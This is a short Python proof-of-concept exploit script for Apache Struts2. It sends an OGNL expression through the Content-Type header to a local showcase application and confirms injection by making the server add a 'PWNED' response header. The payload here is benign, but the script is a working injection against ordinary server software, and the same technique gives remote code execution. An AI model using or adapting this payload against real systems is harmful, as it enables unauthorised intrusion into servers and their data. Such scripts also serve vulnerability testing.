#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib.request, urllib.error, urllib.parse
import http.client


ognl_payload = ".multipart/form-data~${"
ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
ognl_payload += "}"
url = 'http://127.0.0.1:8360/struts2-showcase/showcase.action'
print("\nInjecting Header PWNED: 1337")

headers = {'Content-Type': ognl_payload}
request = urllib.request.Request(url, headers=headers)
response = urllib.request.urlopen(request)
print("\n\n", response.headers)
